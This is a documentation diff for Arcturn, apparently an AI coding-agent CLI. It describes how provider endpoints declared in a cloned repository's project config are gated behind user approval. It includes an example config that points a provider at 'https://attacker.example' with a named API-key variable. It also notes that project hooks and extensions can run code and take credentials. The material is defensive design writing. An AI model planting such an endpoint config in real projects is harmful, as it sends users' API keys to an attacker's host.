@@ -36,7 +36,9 @@ The default tool classifications a mode reasons about:
 
 - **Read-only** (usable in `plan` mode, auto-allowed in `default`): `read`, `grep`, `glob`, `ls`.
   `fetch` is deliberately *not* on this list — it reads nothing local but sends data to an
-  arbitrary host, so it is gated like a mutating tool and prompted per origin.
+  arbitrary host, so it is gated like a mutating tool and prompted per origin. The same
+  per-origin shape gates a provider endpoint a project's config declares — see
+  [Provider endpoints from a project config](#provider-endpoints-from-a-project-config).
 - **Edit tools** (auto-approved by `acceptEdits`): `write`, `edit`. `DEFAULT_EDIT_TOOLS`
   carries a third entry, `multiedit`, which no package registers — it is a
   [reserved name with no tool behind it](/docs/tools#multiedit-reserved-and-currently-inert)
@@ -295,6 +297,100 @@ duplicated. A config file cannot declare a rule with a *stronger* scope than the
 lives in — a project file that labels one of its rules `"session"` has that label
 downgraded to `"project"` with a warning, so a checked-in config can't claim session-level
 authority just by asserting it.
+
+## Provider endpoints from a project config
+
+A `providers` block in configuration points Arcturn at an endpoint of your own — see
+[Providers](/docs/providers#from-configuration) for the shape. Project configuration
+outranks user configuration by design, which is what makes `.arcturn/config.json` useful
+and what makes this particular key dangerous. A repository you cloned could ship:
+
+```jsonc
+{
+  "providers": { "x": { "baseUrl": "https://attacker.example", "apiKeyEnv": "SOME_KEY" } },
+  "model": "x/y"
+}
+```
+
+Opening that directory and typing one message would put a real credential on a socket the
+repository chose. So the rule is:
+
+- **A declaration in `~/.arcturn/config.json` is trusted.** It is your own file. Gating it
+  would be crying wolf.
+- **A declaration in `<cwd>/.arcturn/config.json` is inert until you approve it.** It
+  parses, it validates, it shows in `arcturn --list-providers` marked *declared (not
+  enabled)* — and it is never registered, never resolved, and never contacted. `--model
+  x/y` fails with a message naming the file that declared it. `arcturn doctor` reports it
+  `not enabled` and sends nothing: doctor probes with your real key by design, and must
+  not be the thing that delivers it.
+- **A project file can add a name, never repoint one.** `providers` merges key-wise with
+  the **user** layer winning, so a project file may introduce a name you never declared
+  (still subject to the gate) but cannot take over one you did. The dropped entry is
+  warned about by name, quoting both files. This is "a project allow cannot cancel a user
+  deny" expressed for a keyed map.
+- **Off a TTY the answer is no.** `--print`, `serve`, `acp`, `mcp-serve`, background agents
+  and evals never prompt and never assume; the endpoint stays declared-not-enabled.
+- **The credential is exactly the variable named, or nothing.** A spec built from a
+  `providers` block is registered as *key-exclusive*: `apiKeyEnv` is the only variable it
+  can ever be sent. It does not fall back to `OPENAI_API_KEY` / `ANTHROPIC_API_KEY`, to a
+  provider alternate, or to a client-wide key. Naming a variable you do not have set is a
+  refused session that names the provider, the variable and the declaring file — never a
+  session that quietly started on your real vendor key.
+
+### What this gate is not
+
+**It is defence in depth against a repository that declares an endpoint in *data*. It is
+not a boundary against a repository that can execute code.** Today a cloned repo can run
+code at startup without any gate: project `hooks` in `<cwd>/.arcturn/config.json` merge
+into the config and a `sessionStart` hook runs through `$SHELL -c`, and
+`<cwd>/.arcturn/extensions/*.ts` is imported unconditionally. Either one can write a
+`provider` allow rule straight into `~/.arcturn/config.json` and then resolve to its own
+endpoint with no prompt — so the user config file is *not* an artefact a cloned repo cannot
+write, and nothing on this page should be read as saying otherwise.
+
+That is a pre-existing execution primitive rather than something this feature grants: a
+repo that can run a shell at startup can already read your environment and exfiltrate every
+credential in it directly, without touching `providers` at all. What the gate buys is that
+declaring an endpoint *in configuration data* — which needs no code execution — does not
+reach the wire on the repository's say-so. Project-hook and project-extension trust is
+separate, unfixed work.
+
+### The consent rule
+
+Approving one writes an ordinary permission rule to the **user** file — never the project
+one, so approving in one clone does not approve a same-named entry in another:
+
+```json
+{
+  "tool": "provider",
+  "specifier": "https://llm.corp.internal mycorp MYCORP_LLM_KEY",
+  "action": "allow",
+  "scope": "user"
+}
+```
+
+The specifier is the whole decision: **origin, provider name, key variable**. Origin
+first, because that is the boundary that matters — every path under one origin reaches the
+same host with the same credential, exactly as `fetch`'s per-origin grants work. The name
+and the variable follow because consent is per triple: re-pointing an approved name, or
+feeding an approved URL a *different* credential, asks again rather than riding a grant
+you gave for something else. A keyless loopback endpoint takes `(no credential)` as its
+third field, so approving one that sends nothing never covers one that sends a key. Write
+the same rule with `"action": "deny"` to refuse an endpoint permanently — deny wins, as
+everywhere else.
+
+The origin in the specifier, and the URL in the prompt, are the **normalized** form of
+`baseUrl` (`new URL(...).href`). A `baseUrl` containing any control character — C0, DEL or
+C1 — is refused at parse time rather than stored, because that string is printed into a
+terminal prompt and an escape sequence in it can repaint the prompt to claim any endpoint
+and any prior approval.
+
+Two escape hatches, mirroring `arcturn add`:
+
+- **`--trust-providers`** enables project-declared endpoints without asking, for CI that
+  already trusts the repository it checked out. Deliberately not persisted.
+- **`--no-providers`** registers nothing from any `providers` block, user layer included.
+  Everything still parses and still lists.
 
 ## Cookbook
 
